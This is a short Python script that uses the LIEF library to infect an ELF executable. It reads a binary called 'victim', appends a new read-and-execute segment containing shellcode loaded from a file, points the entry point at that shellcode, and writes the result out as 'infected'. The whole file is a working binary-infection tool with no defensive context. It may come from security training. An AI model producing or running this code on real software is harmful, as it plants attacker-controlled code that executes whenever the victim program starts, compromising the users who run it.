import lief

binary = lief.parse("victim")
print("[*] Original entry point:", hex(binary.header.entrypoint))

# Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = list(f.read())

# Find highest virtual address and file offset among LOAD segments
max_vaddr = 0
max_offset = 0
for seg in binary.segments:
    if seg.type == 1:  # PT_LOAD (manual)
        max_vaddr = max(max_vaddr, seg.virtual_address + seg.virtual_size)
        max_offset = max(max_offset, seg.file_offset + seg.physical_size)

# Align both to page boundary
aligned_vaddr = (max_vaddr + 0x1000) & ~0xfff
aligned_offset = (max_offset + 0x1000) & ~0xfff

# Create new segment manually
segment = lief.ELF.Segment()
segment.type = 1  # PT_LOAD
segment.flags = lief.ELF.Segment.FLAGS(5) # R + X → 0x1 | 0x4 = 0x5
segment.alignment = 0x1000
segment.virtual_address = aligned_vaddr
segment.file_offset = aligned_offset
segment.content = shellcode
segment.physical_size = len(shellcode)
segment.virtual_size = len(shellcode)

# Add the segment to binary
binary.add(segment)

# Patch the binary's entry point
binary.header.entrypoint = aligned_vaddr
print("[*] New entry point:", hex(aligned_vaddr))

# Write to disk
binary.write("infected")
print("[+] Infected binary written to 'infected'")
